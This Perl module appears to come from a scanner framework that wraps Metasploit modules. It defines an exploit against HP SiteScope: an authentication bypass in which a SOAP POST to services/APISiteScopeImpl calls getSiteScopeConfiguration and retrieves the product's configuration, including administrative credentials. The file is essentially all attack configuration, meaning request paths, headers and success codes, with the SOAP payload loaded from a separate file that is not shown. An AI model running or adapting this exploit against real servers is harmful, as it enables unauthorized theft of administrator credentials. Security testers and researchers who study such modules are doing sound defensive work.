package MSFExploits::Exploits::HP::MSF::HpSitescopeGetsitescopeconfiguration;
# use parent qw(MSFExploits::Exploit MSFExploits::Services::HP);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # use MSFExploits::Functions::Basic;
# # use MSFExploits::Functions::Errors;
# # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "HpSitescopeGetsitescopeconfiguration";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

          This module exploits an authentication bypass vulnerability in HP SiteScope

        which allows to retrieve the HP SiteScope configuration, including administrative

        credentials. It is accomplished by calling the getSiteScopeConfiguration operation

        available through the APISiteScopeImpl AXIS service. The HP SiteScope Configuration

        is retrieved as file containing Java serialization data. This module has been

        tested successfully on HP SiteScope 11.20 over Windows 2003 SP2 and Linux Centos

        6.3.

      ",
  METHOD => "POST",
  MSF_MODULE => "hp_sitescope_getsitescopeconfiguration",
  OSVDB => 85120,
  PATHS => ["SiteScope/"],
  TITLE => "HP SiteScope SOAP Call getSiteScopeConfiguration Configuration Access",
  VARIABLES => {
    'PATH' =>       { DESCRIPTION => "Path to SiteScope", VALUE => "/SiteScope/" },
  },

  TYPE => 'MSF',
  PLATFORM => 'SCANNER',
  REQUESTS => {
    EXPLOIT5 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #5 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'services/APISiteScopeImpl',
      PAYLOAD      => read_file('Exploits/HP/MSF/src/HpSitescopeGetsitescopeconfiguration.payload', 1),
      TEXT   => 'Sending Exploit #1 Request : [POST] /services/APISiteScopeImpl',
      HEADERS      => {
        'SOAPAction' => '""',
        'Content-Type' => 'text/xml; charset=UTF-8',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
